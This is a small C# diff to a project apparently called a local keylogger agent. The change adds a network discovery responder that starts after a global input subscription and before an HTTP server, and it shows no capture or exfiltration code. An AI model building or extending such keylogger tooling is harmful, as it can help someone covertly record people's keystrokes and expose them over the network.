@@ -12,6 +12,9 @@ namespace Local_Keylogger_Agent
 
             SubscribeGlobal();
 
+            // Start the discovery responder
+            DiscoveryResponder discoveryResponder = new DiscoveryResponder();
+            discoveryResponder.StartDiscoveryResponder();
             // Start the HTTP server
             HTTPServer HTTPServer = new HTTPServer();
             HTTPServer.StartHTTPServer();
